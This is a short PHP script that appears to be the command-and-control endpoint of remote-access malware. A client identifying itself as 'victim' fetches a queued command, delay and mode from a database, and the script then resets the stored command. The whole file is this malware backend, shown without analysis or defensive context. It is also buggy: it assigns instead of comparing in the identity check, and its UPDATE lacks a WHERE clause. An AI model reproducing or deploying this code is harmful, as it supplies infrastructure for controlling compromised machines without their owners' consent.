<?php
	include("conf.php");
	if(isset($_GET["identity"]) && isset($_GET["uID"])) {
		if($_GET["identity"]="victim") {
			$uid=$_GET["uID"];
			$conn=new mysqli($server, $username, $password, $db);
			if(!$conn->connect_errno) {
				if($query=$conn->prepare("SELECT Operand FROM $table WHERE `Key`=?")) {
					$query->bind_param("s", $uid);
					$query->execute();
					$req_data=$query->get_result()->fetch_assoc();
					print $req_data["Operand"];
				}
				if($query=$conn->prepare("UPDATE $table SET Operand=?")) {
					$default_data=[
						"delay"=>5,
						"command"=>"null",
						"mode"=>0
					];
					$default_opr=json_encode($default_data);
					$query->bind_param("s", $default_opr);
					$query->execute();
				}
			}
		}
	}
	else
		print("Insufficient parameters");
?>